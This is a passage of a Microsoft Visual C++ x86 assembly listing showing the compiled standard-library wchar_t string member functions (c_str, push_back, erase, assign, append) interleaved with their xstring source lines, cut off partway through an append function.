?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str, COMDAT
; _this$ = ecx

; 4143 :     _NODISCARD _CONSTEXPR20 _Ret_z_ const _Elem* c_str() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4144 :         return _Mypair._Myval2._Myptr();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEPB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr

; 4145 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?push_back@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEX_W@Z
_TEXT	SEGMENT
__Ptr$1 = -16						; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
$T2 = -4						; size = 2
$T3 = -1						; size = 1
__Ch$ = 8						; size = 2
?push_back@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEX_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::push_back, COMDAT
; _this$ = ecx

; 4082 :     _CONSTEXPR20 void push_back(const _Elem _Ch) { // insert element at end

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4083 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0000f	89 4d f4	 mov	 DWORD PTR __Old_size$[ebp], ecx

; 4084 :         if (_Old_size < _Mypair._Myval2._Myres) {

  00012	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00015	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00018	3b 42 14	 cmp	 eax, DWORD PTR [edx+20]
  0001b	73 4c		 jae	 SHORT $LN2@push_back

; 4085 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + 1);
; 4086 :             _Mypair._Myval2._Mysize = _Old_size + 1;

  0001d	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  00020	83 c1 01	 add	 ecx, 1
  00023	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00026	89 4a 10	 mov	 DWORD PTR [edx+16], ecx

; 4087 :             _Elem* const _Ptr       = _Mypair._Myval2._Myptr();

  00029	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0002c	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEPA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00031	89 45 f0	 mov	 DWORD PTR __Ptr$1[ebp], eax

; 4088 :             _Traits::assign(_Ptr[_Old_size], _Ch);

  00034	8d 45 08	 lea	 eax, DWORD PTR __Ch$[ebp]
  00037	50		 push	 eax
  00038	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  0003b	8b 55 f0	 mov	 edx, DWORD PTR __Ptr$1[ebp]
  0003e	8d 04 4a	 lea	 eax, DWORD PTR [edx+ecx*2]
  00041	50		 push	 eax
  00042	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00047	83 c4 08	 add	 esp, 8

; 4089 :             _Traits::assign(_Ptr[_Old_size + 1], _Elem());

  0004a	33 c9		 xor	 ecx, ecx
  0004c	66 89 4d fc	 mov	 WORD PTR $T2[ebp], cx
  00050	8d 55 fc	 lea	 edx, DWORD PTR $T2[ebp]
  00053	52		 push	 edx
  00054	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00057	8b 4d f0	 mov	 ecx, DWORD PTR __Ptr$1[ebp]
  0005a	8d 54 41 02	 lea	 edx, DWORD PTR [ecx+eax*2+2]
  0005e	52		 push	 edx
  0005f	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00064	83 c4 08	 add	 esp, 8

; 4090 :             return;

  00067	eb 19		 jmp	 SHORT $LN1@push_back
$LN2@push_back:

; 4091 :         }
; 4092 : 
; 4093 :         _Reallocate_grow_by(

  00069	33 c0		 xor	 eax, eax
  0006b	88 45 ff	 mov	 BYTE PTR $T3[ebp], al
  0006e	0f b7 4d 08	 movzx	 ecx, WORD PTR __Ch$[ebp]
  00072	51		 push	 ecx
  00073	0f b6 55 ff	 movzx	 edx, BYTE PTR $T3[ebp]
  00077	52		 push	 edx
  00078	6a 01		 push	 1
  0007a	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0007d	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>,wchar_t>
$LN1@push_back:

; 4094 :             1,
; 4095 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const _Elem _Ch) {
; 4096 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 4097 :                 _Traits::assign(_New_ptr[_Old_size], _Ch);
; 4098 :                 _Traits::assign(_New_ptr[_Old_size + 1], _Elem());
; 4099 :             },
; 4100 :             _Ch);
; 4101 :     }

  00082	8b e5		 mov	 esp, ebp
  00084	5d		 pop	 ebp
  00085	c2 04 00	 ret	 4
?push_back@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEX_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::push_back
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??B?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBE?AV?$basic_string_view@_WU?$char_traits@_W@std@@@1@XZ
_TEXT	SEGMENT
tv76 = -12						; size = 4
tv78 = -8						; size = 4
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
??B?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBE?AV?$basic_string_view@_WU?$char_traits@_W@std@@@1@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator std::basic_string_view<wchar_t,std::char_traits<wchar_t> >, COMDAT
; _this$ = ecx

; 4076 :     /* implicit */ _CONSTEXPR20 operator basic_string_view<_Elem, _Traits>() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4077 :         // return a string_view around *this's character-type sequence
; 4078 :         return basic_string_view<_Elem, _Traits>{_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize};

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEPB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00011	89 45 f4	 mov	 DWORD PTR tv76[ebp], eax
  00014	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00017	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0001a	89 4d f8	 mov	 DWORD PTR tv78[ebp], ecx
  0001d	8b 55 f8	 mov	 edx, DWORD PTR tv78[ebp]
  00020	52		 push	 edx
  00021	8b 45 f4	 mov	 eax, DWORD PTR tv76[ebp]
  00024	50		 push	 eax
  00025	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00028	e8 00 00 00 00	 call	 ??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_WI@Z ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::basic_string_view<wchar_t,std::char_traits<wchar_t> >
  0002d	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 4079 :     }

  00030	8b e5		 mov	 esp, ebp
  00032	5d		 pop	 ebp
  00033	c2 04 00	 ret	 4
??B?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBE?AV?$basic_string_view@_WU?$char_traits@_W@std@@@1@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator std::basic_string_view<wchar_t,std::char_traits<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?erase@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I@Z
_TEXT	SEGMENT
tv69 = -8						; size = 4
_this$ = -4						; size = 4
__Off$ = 8						; size = 4
?erase@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::erase, COMDAT
; _this$ = ecx

; 3663 :     _CONSTEXPR20 basic_string& erase(const size_type _Off = 0) { // erase elements [_Off, ...)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 3664 :         _Mypair._Myval2._Check_offset(_Off);

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR tv69[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Off$[ebp]
  00012	51		 push	 ecx
  00013	8b 4d f8	 mov	 ecx, DWORD PTR tv69[ebp]
  00016	e8 00 00 00 00	 call	 ?_Check_offset@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEXI@Z ; std::_String_val<std::_Simple_types<wchar_t> >::_Check_offset

; 3665 :         _Eos(_Off);

  0001b	8b 55 08	 mov	 edx, DWORD PTR __Off$[ebp]
  0001e	52		 push	 edx
  0001f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00022	e8 00 00 00 00	 call	 ?_Eos@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Eos

; 3666 :         return *this;

  00027	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 3667 :     }

  0002a	8b e5		 mov	 esp, ebp
  0002c	5d		 pop	 ebp
  0002d	c2 04 00	 ret	 4
?erase@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::erase
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@QB_WI@Z
_TEXT	SEGMENT
__Old_ptr$1 = -12					; size = 4
_this$ = -8						; size = 4
$T2 = -4						; size = 2
$T3 = -1						; size = 1
__Ptr$ = 8						; size = 4
__Count$ = 12						; size = 4
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@QB_WI@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign, COMDAT
; _this$ = ecx

; 3410 :         _In_reads_(_Count) const _Elem* const _Ptr, _CRT_GUARDOVERFLOW const size_type _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 3411 :         // assign [_Ptr, _Ptr + _Count)
; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 4d 0c	 mov	 ecx, DWORD PTR __Count$[ebp]
  0000f	3b 48 14	 cmp	 ecx, DWORD PTR [eax+20]
  00012	77 49		 ja	 SHORT $LN2@assign

; 3413 :             _ASAN_STRING_REMOVE(*this);
; 3414 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

  00014	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00017	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEPA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  0001c	89 45 f4	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  0001f	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00022	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  00025	89 42 10	 mov	 DWORD PTR [edx+16], eax

; 3416 :             _Traits::move(_Old_ptr, _Ptr, _Count);

  00028	8b 4d 0c	 mov	 ecx, DWORD PTR __Count$[ebp]
  0002b	51		 push	 ecx
  0002c	8b 55 08	 mov	 edx, DWORD PTR __Ptr$[ebp]
  0002f	52		 push	 edx
  00030	8b 45 f4	 mov	 eax, DWORD PTR __Old_ptr$1[ebp]
  00033	50		 push	 eax
  00034	e8 00 00 00 00	 call	 ?move@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::move
  00039	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  0003c	33 c9		 xor	 ecx, ecx
  0003e	66 89 4d fc	 mov	 WORD PTR $T2[ebp], cx
  00042	8d 55 fc	 lea	 edx, DWORD PTR $T2[ebp]
  00045	52		 push	 edx
  00046	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  00049	8b 4d f4	 mov	 ecx, DWORD PTR __Old_ptr$1[ebp]
  0004c	8d 14 41	 lea	 edx, DWORD PTR [ecx+eax*2]
  0004f	52		 push	 edx
  00050	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00055	83 c4 08	 add	 esp, 8

; 3418 :             _ASAN_STRING_CREATE(*this);
; 3419 :             return *this;

  00058	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0005b	eb 1a		 jmp	 SHORT $LN1@assign
$LN2@assign:

; 3420 :         }
; 3421 : 
; 3422 :         return _Reallocate_for(

  0005d	33 c0		 xor	 eax, eax
  0005f	88 45 ff	 mov	 BYTE PTR $T3[ebp], al
  00062	8b 4d 08	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  00065	51		 push	 ecx
  00066	0f b6 55 ff	 movzx	 edx, BYTE PTR $T3[ebp]
  0006a	52		 push	 edx
  0006b	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  0006e	50		 push	 eax
  0006f	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00072	e8 00 00 00 00	 call	 ??$_Reallocate_for@V<lambda_03628ca18370b1f44a99b655e704819b>@@PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_03628ca18370b1f44a99b655e704819b>@@PB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<<lambda_03628ca18370b1f44a99b655e704819b>,wchar_t const *>
$LN1@assign:

; 3423 :             _Count,
; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {
; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);
; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());
; 3427 :             },
; 3428 :             _Ptr);
; 3429 :     }

  00077	8b e5		 mov	 esp, ebp
  00079	5d		 pop	 ebp
  0007a	c2 08 00	 ret	 8
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@QB_WI@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I_W@Z
_TEXT	SEGMENT
__Old_ptr$1 = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
$T2 = -4						; size = 2
$T3 = -1						; size = 1
__Count$ = 8						; size = 4
__Ch$ = 12						; size = 2
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append, COMDAT
; _this$ = ecx

; 3331 :     _CONSTEXPR20 basic_string& append(_CRT_GUARDOVERFLOW const size_type _Count, const _Elem _Ch) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 3332 :         // append _Count * _Ch
; 3333 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0000f	89 4d f4	 mov	 DWORD PTR __Old_size$[ebp], ecx

; 3334 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

  00012	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00015	8b 42 14	 mov	 eax, DWORD PTR [edx+20]
  00018	2b 45 f4	 sub	 eax, DWORD PTR __Old_size$[ebp]
  0001b	39 45 08	 cmp	 DWORD PTR __Count$[ebp], eax
  0001e	77 56		 ja	 SHORT $LN2@append

; 3335 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + _Count);
; 3336 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  00020	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  00023	03 4d 08	 add	 ecx, DWORD PTR __Count$[ebp]
  00026	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00029	89 4a 10	 mov	 DWORD PTR [edx+16], ecx

; 3337 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

  0002c	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0002f	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEPA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00034	89 45 f0	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 3338 :             _Traits::assign(_Old_ptr + _Old_size, _Count, _Ch);

  00037	0f b7 45 0c	 movzx	 eax, WORD PTR __Ch$[ebp]
  0003b	50		 push	 eax
  0003c	8b 4d 08	 mov	 ecx, DWORD PTR __Count$[ebp]
  0003f	51		 push	 ecx
  00040	8b 55 f4	 mov	 edx, DWORD PTR __Old_size$[ebp]
  00043	8b 45 f0	 mov	 eax, DWORD PTR __Old_ptr$1[ebp]
  00046	8d 0c 50	 lea	 ecx, DWORD PTR [eax+edx*2]
  00049	51		 push	 ecx
  0004a	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAPA_WQA_WI_W@Z ; std::_WChar_traits<wchar_t>::assign
  0004f	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3339 :             _Traits::assign(_Old_ptr[_Old_size + _Count], _Elem());

  00052	33 d2		 xor	 edx, edx
  00054	66 89 55 fc	 mov	 WORD PTR $T2[ebp], dx
  00058	8d 45 fc	 lea	 eax, DWORD PTR $T2[ebp]
  0005b	50		 push	 eax
  0005c	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  0005f	03 4d 08	 add	 ecx, DWORD PTR __Count$[ebp]
  00062	8b 55 f0	 mov	 edx, DWORD PTR __Old_ptr$1[ebp]
  00065	8d 04 4a	 lea	 eax, DWORD PTR [edx+ecx*2]
  00068	50		 push	 eax
  00069	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  0006e	83 c4 08	 add	 esp, 8

; 3340 :             return *this;

  00071	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00074	eb 1f		 jmp	 SHORT $LN1@append
$LN2@append:

; 3341 :         }
; 3342 : 
; 3343 :         return _Reallocate_grow_by(

  00076	33 c9		 xor	 ecx, ecx
  00078	88 4d ff	 mov	 BYTE PTR $T3[ebp], cl
  0007b	0f b7 55 0c	 movzx	 edx, WORD PTR __Ch$[ebp]
  0007f	52		 push	 edx
  00080	8b 45 08	 mov	 eax, DWORD PTR __Count$[ebp]
  00083	50		 push	 eax
  00084	0f b6 4d ff	 movzx	 ecx, BYTE PTR $T3[ebp]
  00088	51		 push	 ecx
  00089	8b 55 08	 mov	 edx, DWORD PTR __Count$[ebp]
  0008c	52		 push	 edx
  0008d	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00090	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@I_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@I_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_c3135ae829aeedc0a8af1bd1e887c66a>,unsigned int,wchar_t>
$LN1@append:

; 3344 :             _Count,
; 3345 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const size_type _Count,
; 3346 :                 const _Elem _Ch) {
; 3347 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 3348 :                 _Traits::assign(_New_ptr + _Old_size, _Count, _Ch);
; 3349 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());
; 3350 :             },
; 3351 :             _Count, _Ch);
; 3352 :     }

  00095	8b e5		 mov	 esp, ebp
  00097	5d		 pop	 ebp
  00098	c2 08 00	 ret	 8
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@QB_WI@Z
_TEXT	SEGMENT
__Old_ptr$1 = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
$T2 = -4						; size = 2
$T3 = -1						; size = 1
__Ptr$ = 8						; size = 4
__Count$ = 12						; size = 4
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@QB_WI@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append, COMDAT
; _this$ = ecx

; 3304 :         _In_reads_(_Count) const _Elem* const _Ptr, _CRT_GUARDOVERFLOW const size_type _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 3305 :         // append [_Ptr, _Ptr + _Count)
; 3306 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0000f	89 4d f4	 mov	 DWORD PTR __Old_size$[ebp], ecx

; 3307 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

  00012	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00015	8b 42 14	 mov	 eax, DWORD PTR [edx+20]
  00018	2b 45 f4	 sub	 eax, DWORD PTR __Old_size$[ebp]
  0001b	39 45 0c	 cmp	 DWORD PTR __Count$[ebp], eax
  0001e	77 55		 ja	 SHORT $LN2@append

; 3308 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + _Count);
; 3309 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  00020	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  00023	03 4d 0c	 add	 ecx, DWORD PTR __Count$[ebp]
  00026	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00029	89 4a 10	 mov	 DWORD PTR [edx+16], ecx

; 3310 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

  0002c	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0002f	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEPA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00034	89 45 f0	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 3311 :             _Traits::move(_Old_ptr + _Old_size, _Ptr, _Count);

  00037	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  0003a	50		 push	 eax
  0003b	8b 4d 08	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  0003e	51		 push	 ecx
  0003f	8b 55 f4	 mov	 edx, DWORD PTR __Old_size$[ebp]
  00042	8b 45 f0	 mov	 eax, DWORD PTR __Old_ptr$1[ebp]
  00045	8d 0c 50	 lea	 ecx, DWORD PTR [eax+edx*2]
  00048	51		 push	 ecx
  00049	e8 00 00 00 00	 call	 ?move@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::move
  0004e	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3312 :             _Traits::assign(_Old_ptr[_Old_size + _Count], _Elem());

  00051	33 d2		 xor	 edx, edx
  00053	66 89 55 fc	 mov	 WORD PTR $T2[ebp], dx
  00057	8d 45 fc	 lea	 eax, DWORD PTR $T2[ebp]
  0005a	50		 push	 eax
  0005b	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  0005e	03 4d 0c	 add	 ecx, DWORD PTR __Count$[ebp]
  00061	8b 55 f0	 mov	 edx, DWORD PTR __Old_ptr$1[ebp]
  00064	8d 04 4a	 lea	 eax, DWORD PTR [edx+ecx*2]
  00067	50		 push	 eax
  00068	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  0006d	83 c4 08	 add	 esp, 8

; 3313 :             return *this;

  00070	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00073	eb 1e		 jmp	 SHORT $LN1@append
$LN2@append:

; 3314 :         }
; 3315 : 
; 3316 :         return _Reallocate_grow_by(

  00075	33 c9		 xor	 ecx, ecx
  00077	88 4d ff	 mov	 BYTE PTR $T3[ebp], cl
  0007a	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  0007d	52		 push	 edx
  0007e	8b 45 08	 mov	 eax, DWORD PTR __Ptr$[ebp]
  00081	50		 push	 eax
  00082	0f b6 4d ff	 movzx	 ecx, BYTE PTR $T3[ebp]
  00086	51		 push	 ecx
  00087	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  0008a	52		 push	 edx
  0008b	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0008e	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_2fb699096920f2dc628cb0826b07831d>@@PB_WI@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_2fb699096920f2dc628cb0826b07831d>@@PB_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_2fb699096920f2dc628cb0826b07831d>,wchar_t const *,unsigned int>
$LN1@append:

; 3317 :             _Count,
; 3318 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const _Elem* const _Ptr,
